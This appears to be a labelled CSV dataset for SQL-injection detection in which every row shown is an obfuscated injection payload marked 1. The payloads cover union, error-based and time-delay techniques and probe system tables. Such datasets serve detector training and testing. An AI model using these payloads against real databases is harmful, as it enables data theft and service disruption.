Query,Label
"1""   )    )     )   %%a%nd   (  %%s%e%l%e%%c%t 9067 %%f%%r%%om  (  %%s%e%l%e%%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%e%l%e%%c%t   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo%%r  (  r%%a%nd  (  0  )  *2   )    )   x %%f%%r%%om %%i%nfo%%rmation_schema.character_s%ets group %b%y x  )  a  )   %%a%nd    (    (     (  ""blkt"" %l%%i%k%%e ""blkt",1
"-2605%'   )    )     )   %%uni%%o%n all s%%e%l%%ect 4738,4738#",1
"1%""   )    )     )   waitf%%o%%r delay '0:0:5' a%n%%d    (    (     (  ""%""  =  """,1
"1'   )    )    %%o%r %u%pda%t%%exml  (  1808,concat  (  0x2e,0x7171706a71,  (  %s%ele%c%%t   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   %an%%d    (    (   'gydh'  =  'gydh",1
"1' %%u%nion all %s%%e%l%%e%ct n%ul%l,n%ul%l,n%ul%l,n%ul%l,n%ul%l,n%ul%l,n%ul%l--",1
5739-5738,1
"-7296%'   )    )     )   %%u%ni%o%%n all s%e%%lec%%t 9322,9322,9322,9322--",1
%%s%%e%le%%c%t   (  case when   (  7033  =  1594  )   then 7033 else 7033*  (  %%s%%e%le%%c%t 7033 %%fr%%om %%i%%nformation_schema.character_s%e%%ts  )   end  )  #,1
"1"" %%and exp  (  ~  (  se%l%%ect * fr%om   (  se%l%%ect concat  (  0x7171706a71,  (  se%l%%ect   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    %%and ""qzzg"" %l%%i%k%e ""qzzg",1
"1%"" %%an%%d 8594  =    (  %se%l%ec%t 8594 %%fr%%o%%m pg_sleep  (  5   )    )   --",1
"1'  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",1
"-4044%"" %o%%r 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%e%%lect   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   %%fr%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    %%a%n%d ""%""  =  """,1
"1""   )    )    as nejd %wh%%e%r%e 2885  =  2885",1
-2745   )    )    as aywp %%w%%h%%e%re 9735  =  9735 or 5903  =    (  'qqpjq'||  (  %s%e%%l%ect case 5903 when 5903 then 1 else 0 end %%from rdb$%%d%%a%%t%%a%%ba%%s%%e  )  ||'qzvzq'  )  --,1
"%s%e%l%%ec%%t benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (     (  9847  =  9847",1
"-1844""   )    )     )   %%o%%r make_%s%e%%t  (  9354  =  9354,7185  )   a%nd    (    (     (  ""abdw"" %l%%i%%ke ""abdw",1
"-8651""  )   %where 8391  =  8391 %%uni%%o%n all %%se%l%ec%t 8391,8391#",1
-4562'  )   %%o%%r 3038  =  3038,1
"1""  )   wh%e%%r%%e 7840  =  7840 un%io%%n all %%se%le%%c%t %n%u%%l%%l,%n%u%%l%%l#",1
"-7382'   )    )    %%o%r make_%s%%e%%t  (  9425  =  4330,4330  )   %a%%n%d    (    (   'tvaz' l%i%%k%%e 'tvaz",1
"%s%el%%ec%t count  (  *  )   fr%o%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 %%a%%n%%d   (  ""yobb"" %l%%i%%ke ""yobb",1
"1' a%%nd elt  (  1210  =  1210,sleep  (  5   )    )   ",1
"-9037%"" u%%n%%i%%on all %%s%ele%%ct 6583#",1
"1"" %w%h%%er%e 7022  =  7022",1
"-4285'   )    )     )   %%u%%n%i%on all %s%el%%ect 8819,8819,8819,8819,8819,8819,8819,8819#",1
1 r%l%i%ke   (  %%s%e%%l%ec%%t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   -- jduw,1
"1'   (  s%el%ect   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%u%%l%%l  )  ,0  )  ,500000000  )  ,n%u%%l%%l  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   %fr%o%m   (  %va%%lu%e%%s  (  0   )    )     )   %%an%d 'fsvr'  =  'fsvr",1
"1 a%%n%%d elt  (  1210  =  1210,sleep  (  5   )    )   ",1
%%se%%lect case when 2948  =  7279 then 1 else nu%l%%l end--,1
"-1964'  )   as ihsp %%w%%h%e%r%%e 6379  =  6379 %or elt  (  6945  =  6165,6165  )  --",1
"1%' uni%%on all %s%%ele%%c%t n%ull,n%ull,n%ull--",1
"1%""   )    )     )   o%r   (  s%el%e%c%%t 9173 %%f%r%%o%%m  (  s%el%e%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  s%el%e%c%%t   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floo%r  (  ra%%nd  (  0  )  *2   )    )   x %%f%r%%o%%m %i%nfo%rmation_schema.character_s%%ets group by x  )  a  )   a%%nd    (    (     (  ""%""  =  """,1
"-8133'  )   %u%%n%%ion all %s%e%%l%%e%c%%t 6417,6417,6417,6417,6417,6417,6417,6417--",1
"-5396'||  (  %se%l%%e%c%t 'fjhd' %%f%r%%o%%m dual %%wh%%ere 4019  =  4019 %u%%n%i%%o%%n all %se%l%%e%c%t 4019,4019,4019,4019#",1
"1  )   as wuio %%wh%er%e 5312  =  5312 %or 7552  =    (  s%e%%l%%e%%ct count  (  *  )   %%f%%r%%o%%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"1   )    )    %a%n%d 6414  =    (  %se%%l%ect count  (  *  )   f%r%o%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   %a%n%d    (    (   4048  =  4048",1
"1""  )   %%wh%e%%r%e 3393  =  3393 o%r 9643  =    (  %%se%l%%e%%ct count  (  *  )   f%r%o%%m doma%i%%n.doma%i%%ns as t1,doma%i%%n.columns as t2,doma%i%%n.%t%a%%b%les as t3  )  --",1
"1'   )    )    %o%%r 9643  =    (  s%ele%%ct count  (  *  )   %f%%ro%m doma%%i%%n.doma%%i%%ns as t1,doma%%i%%n.columns as t2,doma%%i%%n.%t%%a%b%%les as t3  )   an%%d    (    (   'ozan'  =  'ozan",1
"1%""   )    )     )   %an%d %%up%%datexml  (  3393,concat  (  0x2e,0x7171706a71,  (  %%s%e%l%%e%%c%%t   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   %an%d    (    (     (  ""%""  =  """,1
"1""   )    )    as rign w%he%%r%%e 1604  =  1604 %%an%d 3661  =  3054--",1
"1'   )    )    %%a%nd elt  (  1210  =  1210,sleep  (  5   )    )    %%a%nd    (    (   'ogpg'  =  'ogpg",1
-6813   )    )     )   %or 6872  =  6872 a%%n%%d    (    (     (  7304  =  7304,1
-1876%'  )   %un%%i%%o%%n all %%s%e%%l%e%c%%t 6463--,1
-1908'   )    )     )   uni%on all %s%el%e%%c%%t 7665#,1
"1  )   as wvpl %w%h%%ere 9791  =  9791 a%n%d make_s%%e%t  (  3491  =  9067,9067  )  --",1
1%'   )    )    %%a%%n%%d 7533  =  7533 %%a%%n%%d    (    (   '%'  =  ',1
"-9858"" %%o%r 8592  =  8553",1
1 an%d 3715 %%i%n    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %s%e%le%c%t   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # yoch,1
-3862'  )   %%o%r 9323  =  9323#,1
1   )    )     )   %%a%%n%%d 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %%sel%ect   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   %%a%%n%%d    (    (     (  3505  =  3505,1
"1 %%o%%r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substr%%i%%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%nul%%l  )  ,0  )  ,500000000  )  ,%nul%%l  )  # utdm",1
"1'   )    )     )   %or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%%ing  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,%%nul%%l  )   %%an%d    (    (     (  'cylu'  =  'cylu",1
"1  )   as tjwa %wh%e%%r%e 1173  =  1173 o%r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  s%%e%l%ec%t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   --",1
"-2028%'   )    )     )   %o%r 1570  =  convert  (  i%nt,  (  %sel%%e%c%t char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  %sel%%e%c%t   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   %%a%nd    (    (     (  '%'  =  '",1
"1""   )    )    as jrld %whe%re 3488  =  3488",1
"1""   )    )     )   or 4915  =    (  %%se%%l%%ec%%t count  (  *  )   fr%%o%%m domai%%n.domai%%ns as t1,domai%%n.columns as t2,domai%%n.ta%%bles as t3  )  --",1
"-6659'  )   %w%%he%re 1256  =  1256 u%%ni%%on all %%s%%el%%e%c%t 1256,1256--",1
"-1598   )    )     )   u%%n%%i%%o%n all %s%%e%l%e%%ct 9418,9418,9418,9418,9418,9418,9418#",1
"1'||  (  %%sel%ec%t 'mzsy' w%her%e 4940  =  4940 %%or elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"-2667  )   u%%ni%%o%n all s%%e%%l%%e%c%t 5848,5848,5848,5848--",1
1'||  (  %%s%e%l%%ec%%t 'allj' w%%h%ere 7334  =  7334,1
"1"" %%a%%n%d elt  (  4249  =  4249,7259  )   %%a%%n%d ""kgtz"" %l%i%%ke ""kgtz",1
"1%' %%a%n%d elt  (  1210  =  1210,sleep  (  5   )    )    %%a%n%d '%'  =  '",1
"1%'   )    )     )   u%%n%io%%n all %%s%%e%l%%ec%t %n%%u%%l%l,%n%%u%%l%l,%n%%u%%l%l,%n%%u%%l%l,%n%%u%%l%l,%n%%u%%l%l--",1
-5694   )    )    as cxnb wh%e%r%%e 6858  =  6858 o%r 9323  =  9323#,1
"-5597'  )   o%r make_%%s%%e%%t  (  2490  =  2164,2164  )  ",1
1'||  (  %se%l%%e%%ct 'ptkj' %%fr%o%m dual w%%here 6263  =  6263 u%n%ion all %se%l%%e%%ct nu%l%l--,1
1  )   as jdhz w%%h%e%%r%%e 2021  =  2021,1
"1%'   )    )     )   %o%%r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"1""  )   %%wh%%e%%r%e 9223  =  9223 %a%%n%%d exp  (  ~  (  %s%%e%l%e%%c%%t * %%fr%%om   (  %s%%e%l%e%%c%%t concat  (  0x7171706a71,  (  %s%%e%l%e%%c%%t   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1
"1'   )    )     )   %a%n%d 3202  =  %%l%%i%%k%%e  (  'abcdefg',upper  (  hex  (  r%a%n%domblob  (  500000000/2   )    )      )    )    %a%n%d    (    (     (  'zovb' %%l%%i%%k%%e 'zovb",1
"1'   )    )     )   %%a%%n%%d make_%s%%et  (  8403  =  8403,8899  )   %%a%%n%%d    (    (     (  'zxon' li%k%e 'zxon",1
"1'   )    )     )    (  s%e%l%%e%%ct   (  case when   (  5451  =  5451  )   then regexp_substr%%i%ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,n%%u%%ll  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   fr%om %%i%nf%%o%rmation_schema.system_users  )   %%an%%d    (    (     (  'owga' %l%%i%%ke 'owga",1
"1""  )   as wvxt w%h%e%r%e 7321  =  7321 %a%nd 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"%%s%%el%%ec%%t dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   %fr%o%%m dual# gnga",1
"1 %o%%r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  %%s%%el%%ec%%t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )   # ogwe",1
"1 %%w%%h%%e%%r%%e 3535  =  3535 %%a%%nd 3580  =    (  %%se%l%e%%ct count  (  *  )   %f%%rom doma%%in.doma%%ins as t1,doma%%in.columns as t2,doma%%in.%t%%ab%%l%es as t3  )  --",1
"1"" %%a%n%d row  (  6237,7469  )  >  (  %s%%ele%%ct count  (  *  )  ,concat  (  0x7171706a71,  (  %s%%ele%%ct   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,flo%o%%r  (  r%%a%n%d  (  0  )  *2   )    )   x %%fro%%m   (  %s%%ele%%ct 5192 %%un%i%o%%n %s%%ele%%ct 3785 %%un%i%o%%n %s%%ele%%ct 3931 %%un%i%o%%n %s%%ele%%ct 7158  )  a group %b%%y x  )   %%a%n%d ""mezx"" %%lik%%e ""mezx",1
"1  )   a%%n%d 8635  =    (  %se%%l%%ect count  (  *  )   f%%r%%o%m generate_series  (  1,5000000   )    )   --",1
"-7511   )    )    as xqzf %%wh%%e%%re 9939  =  9939 %%u%%n%%io%%n all se%lec%%t 9939,9939,9939,9939,9939,9939,9939--",1
"1' %w%h%%e%r%e 8803  =  8803 o%r 4411  =    (  s%e%%lect count  (  *  )   %fr%%om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1'   )    )    as bbdf %%w%h%e%r%e 1327  =  1327,1
"1  )   as nlig w%h%ere 5964  =  5964 %%an%%d 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"1%""  )   %o%r   (  %%s%%ele%c%t * f%%rom   (  %%s%%ele%c%t  (  sleep  (  5   )    )     )  ydpu  )   %an%%d   (  ""%""  =  """,1
1   )    )    as kccx %%w%he%re 7547  =  7547 %u%n%i%%o%%n all %s%e%%l%ect %%n%%u%l%%l--,1
"1%' %%and   (  %%s%ele%%c%%t 9067 %%f%%rom  (  %%s%ele%%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%ele%%c%%t   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flo%o%%r  (  r%%and  (  0  )  *2   )    )   x %%f%%rom %i%%nf%o%%rmation_schema.character_%%s%%e%ts group b%%y x  )  a  )   %%and '%'  =  '",1
-7772'   )    )    o%r 9323  =  9323#,1
"iif  (  5571  =  4947,1,1/0  )  ",1
"-6595   )    )     )   %%u%n%i%o%n all %%s%el%e%%c%%t 2688,2688,2688,2688,2688,2688,2688,2688,2688,2688#",1
1'   )    )     )   %and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %s%el%e%%ct   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   %and    (    (     (  'cbnc' %l%%i%k%%e 'cbnc,1
"1'  )   as vlwh %%wh%%e%%r%e 9403  =  9403 %%o%%r elt  (  5873  =  5873,sleep  (  5   )    )   #",1
"1%""  )   %u%n%io%n all s%%ele%c%%t %null,%null#",1
"-4462%""  )   %%o%r 8571  =  8571--",1
"1'   )    )     )   %a%%nd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substr%%ing  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,%n%u%%l%%l  )   %a%%nd    (    (     (  'skdy'  =  'skdy",1
1'   )    )     )   %o%%r   (  s%e%%l%ec%%t * %fr%o%%m   (  s%e%%l%ec%%t  (  sleep  (  5   )    )     )  ydpu  )   %an%%d    (    (     (  'ljhc'  =  'ljhc,1
%sel%e%ct   (  case when   (  4341  =  7041  )   then 4341 else 4341*  (  %sel%e%ct 4341 %fr%%o%m mysql.db  )   end  )  #,1
"-2625'  )   o%%r elt  (  1032  =  1032,3623  )   %a%n%d   (  'eliy'  =  'eliy",1
"waitf%o%r delay '0:0:5' %%a%n%d ""lhcv""  =  ""lhcv",1
"1""  )   w%%h%%ere 2278  =  2278",1
"1   )    )     )   %u%%ni%o%%n all s%%e%l%%ec%%t n%u%%ll,n%u%%ll#",1
"1 %%an%%d 6414  =    (  %%s%ele%%c%t count  (  *  )   fro%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  # hlrg",1
"sel%%e%c%t * %%f%r%o%%m generate_series  (  9167,9167,case when   (  9167  =  2273  )   then 1 else 0 end  )   %l%i%%m%%i%%t 1--",1
-2527   )    )    as oqpy %w%h%%e%%r%e 7468  =  7468 %%or 3038  =  3038,1
1%' waitf%%o%r delay '0:0:5'--,1
"1' %%w%%h%er%e 7080  =  7080 or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",1
"1'+  (  %%s%%e%%l%ec%t 'mikf' %%w%h%%e%%r%e 5814  =  5814 %%o%r 5356  =    (  %%s%%e%%l%ec%t count  (  *  )   %f%r%%om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1   )    )    as rsnb %wh%%e%re 3168  =  3168 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
"1"" %%w%h%%e%r%e 5039  =  5039 a%n%d char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substr%%ing  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,nul%%l  )  ,0  )  ,500000000  )  ,nul%%l  )  --",1
1'  )   %%w%%h%%e%re 9516  =  9516,1
"-9871""  )   u%ni%o%n all %%s%e%%l%%e%ct 9082#",1
1'||  (  sele%%ct 'adni' f%%r%%om dual wher%e 6611  =  6611,1
1   )    )    as wajy %%w%he%%r%e 8593  =  8593,1
-8404   )    )    o%rde%r by 1--,1
"-2759%""   )    )    %%o%%r 7769  =  1249#",1
"  (  %%s%e%%le%ct count  (  *  )   %fr%om sysibm.sys%ta%%b%l%es as t1,sysibm.sys%ta%%b%l%es as t2,sysibm.sys%ta%%b%l%es as t3  )  ",1
"1  )   as nkjo w%he%r%e 8462  =  8462 %uni%%o%%n all %s%e%l%%e%ct %n%u%%ll,%n%u%%ll,%n%u%%ll,%n%u%%ll,%n%u%%ll,%n%u%%ll,%n%u%%ll,%n%u%%ll,%n%u%%ll--",1
"1' w%%he%%r%%e 1628  =  1628 %an%d 6510  =    (  %se%l%e%%c%%t count  (  *  )   fr%%om sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"-4822"" %o%%r 4493  =  utl_%i%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%%e%%lec%t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   %%from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    a%%n%d ""owbp""  =  ""owbp",1
1'  )   w%%h%%e%%r%e 2974  =  2974 a%n%%d 4386  =  utl_%i%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%e%le%%c%%t   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   %f%%r%%om dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,1
1   )    )    as dgso %%w%%he%%r%%e 4654  =  4654 %%an%d 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  s%%e%l%%e%%ct   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"%%se%l%e%c%%t count  (  *  )   %f%r%%om generate_series  (  1,5000000  )   %%a%n%d    (    (     (  1321  =  1321",1
1'  )   as sagj %w%h%%e%%r%e 4558  =  4558,1
1%'   )    )    %o%r   (  selec%%t * f%ro%%m   (  selec%%t  (  sleep  (  5   )    )     )  sddo  )  #,1
"1""   )    )     )   %o%%r extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  %%s%e%l%e%%c%%t   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    a%%nd    (    (     (  ""yxpo"" %l%i%%ke ""yxpo",1
1'+  (  %%se%%le%%c%t oljg %%wh%ere 2006  =  2006 %%an%%d 3754  =    (  %%se%%le%%c%t upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%se%%le%%c%t   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   %%f%r%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   %%f%r%o%%m dual   )    )   +',1
"1%'  )   or exp  (  ~  (  %s%e%l%e%c%%t * %from   (  %s%e%l%e%c%%t concat  (  0x7171706a71,  (  %s%e%l%e%c%%t   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    %and   (  '%'  =  '",1
"-1993%""  )   %o%r 5903  =    (  'qqpjq'||  (  %%s%e%%lec%t case 5903 when 5903 then 1 else 0 end f%%rom rdb$%d%%a%%taba%se  )  ||'qzvzq'  )   a%%nd   (  ""%""  =  """,1
"1  )   as ihan w%h%%e%%r%e 5298  =  5298 a%%n%%d elt  (  6587  =  3479,3479  )  --",1
-5356'  )   %%o%r 9323  =  9323#,1
1'  )   as jztg %w%%h%ere 1222  =  1222 o%%r sleep  (  5  )  #,1
"1   )    )    %and 3580  =    (  %%se%le%c%%t count  (  *  )   %%fr%o%m domai%n.domai%ns as t1,domai%n.columns as t2,domai%n.ta%%b%%l%es as t3  )  --",1
"1   )    )    as gobw %w%h%%ere 3496  =  3496 %%u%ni%%o%n all s%%ele%ct %n%%u%%l%%l,%n%%u%%l%%l,%n%%u%%l%%l,%n%%u%%l%%l,%n%%u%%l%%l,%n%%u%%l%%l,%n%%u%%l%%l,%n%%u%%l%%l,%n%%u%%l%%l--",1
"1"" %o%r 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   %and ""jbty"" %l%%i%ke ""jbty",1
"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substr%%ing  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,nu%ll  )   a%%n%%d 'yaje'  =  'yaje",1
-8370'   )    )    %o%%r   (  3501  =  6407  )  *6407 %a%nd    (    (   'agcm' li%%ke 'agcm,1
"1%""   )    )     )   %a%%n%%d 6969  =    (  %%se%le%%ct 6969 %%f%r%om pg_sleep  (  5   )    )    %a%%n%%d    (    (     (  ""%""  =  """,1
"1"" waitfo%r delay '0:0:5'--",1
"%%s%%el%%e%%ct count  (  *  )   f%%ro%m generate_series  (  1,5000000  )   %a%nd    (    (     (  ""uydm""  =  ""uydm",1
"1'+  (  %s%%el%e%ct uzan %%wh%%e%re 4312  =  4312 and make_se%%t  (  3129  =  9555,9555   )    )   +'",1
"1'  )   o%r %u%%pda%%texml  (  1808,concat  (  0x2e,0x7171706a71,  (  s%el%%e%%ct   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   %%an%d   (  'kejy'  =  'kejy",1
"-9749"" whe%r%%e 7083  =  7083 %%or make_%se%%t  (  7577  =  1182,1182  )  --",1
1%'   )    )     )   %%an%d 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %%sele%%c%t   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   %%an%d    (    (     (  '%'  =  ',1
"-1050""   )    )    %or 4493  =  utl_%i%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%%e%le%%ct   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   fr%%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    %%an%d    (    (   ""%orfo"" l%%i%%ke ""%orfo",1
1%'   )    )     )   %%a%%n%d   (  %s%e%l%%ect * %f%%r%%om   (  %s%e%l%%ect  (  sleep  (  5   )    )     )  gcrr  )  #,1
1'  )   w%her%e 3893  =  3893,1
1%'  )   r%%like sleep  (  5  )  #,1
"-4182   )    )    as wkfh %wh%e%r%%e 6145  =  6145 %u%n%%io%n all s%%el%e%%ct 6145,6145,6145,6145,6145#",1
"1  )   %o%%r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%ul%l  )  ,0  )  ,500000000  )  ,%%n%ul%l  )  ",1
"1'  )   or 8421  =    (  %%s%%e%%l%%e%c%t count  (  *  )   f%%r%o%%m generate_series  (  1,5000000   )    )    an%%d   (  'xkxi' l%%i%%ke 'xkxi",1
"1""  )   %%wh%%ere 9020  =  9020 %or row  (  1045,7562  )  >  (  %%s%el%%e%%c%%t count  (  *  )  ,concat  (  0x7171706a71,  (  %%s%el%%e%%c%%t   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,flo%or  (  r%%a%%nd  (  0  )  *2   )    )   x %%fr%o%m   (  %%s%el%%e%%c%%t 8488 %u%%n%%io%%n %%s%el%%e%%c%%t 5584 %u%%n%%io%%n %%s%el%%e%%c%%t 3051 %u%%n%%io%%n %%s%el%%e%%c%%t 1210  )  a group %%b%y x  )  --",1
"1   )    )     )   %o%r 5356  =    (  %se%%l%%e%ct count  (  *  )   %f%%ro%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
